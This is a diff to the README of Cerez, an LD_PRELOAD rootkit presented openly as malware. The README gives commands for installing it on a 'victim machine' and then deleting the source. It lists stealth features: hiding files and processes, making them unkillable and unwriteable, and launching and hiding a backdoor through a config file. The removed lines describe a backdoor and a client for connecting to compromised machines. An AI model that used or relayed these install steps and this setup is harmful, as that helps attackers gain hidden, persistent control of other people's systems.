@@ -4,43 +4,39 @@
   Cerez 😈 A simple LD_PRELOAD rootkit
 </h1>
 
-Cerez is a LD_PRELOAD rootkit, it consists of two parts, a backdoor 
-(written in python) and a loader (written in c). Loader is a SO binary
-that gets installed into `/lib` and writes its path into `/etc/ld.so.preload`,
-this way every binary on the system preloads it.
-By overwriting system functions like `fopen`, `readdir`, `access` and
-`unlinkat` it makes it nearly impossible to remove/detect the backdoor.
-I also wrote a simple client that you can use to connect the backdoor.
+Cerez is a configurable `LD_PRELOAD` rootkit, by installing it 
+into `/etc/ld.so.preload`, you can preload it before every binary.
+It can protect/hide your backdoor as well other files you want 
+hidden. It does so by overwriting syscalls like `open`, `write`
+and others.
 
 ## Features
-- ✔ Hidden in the process list
-- ✔ Hidden in the file system
-- ✔ Unreadable
-- ✔ Undeleteable
-- ✔ Unwriteable
-- ❌ Hidden in the network list (WIP)
+- ✔ Hides files in the file system 
+- ✔ Hides proceses in the process list 
+- ❌Hides connections in the network list
+- ✔ Makes files unreadable 
+- ✔ Makes files unwriteable 
+- ✔ Makes processes unkillable 
 
-## Installing the rootkit
+## Install 
 To install the rootkit on a victim machine:
 ```
 git clone https://github.com/ngn13/cerez.git
 cd cerez
-chmod +x install.sh
-# before installing see the backdoor.py
-# and change the backdoor password
-./install.sh
+make 
+make install
 cd ..
 rm -rf cerez
 ```
 
-## Installing the client
-To install the client that you can use to connect a
-backdoored machine:
+## Config `(/etc/cerez.cfg)`
 ```
-git clone https://github.com/ngn13/cerez.git
-cd cerez
-chmod +x client.py
-./client.py
+backdoor:/usr/bin/backdoor -> backdoor that will be started by the rootkit
+whitelist:/usr/bin/backdoor --> rootkit won't hide/protect stuff from this 
+output:1 --> if set to 1, cerez will hide any console output that contains hidden file names
+/etc/cerez.cfg -> rest is just the list of the files that will be hidden
+./cerez.cfg
+...
 ```
 
 ## Resources
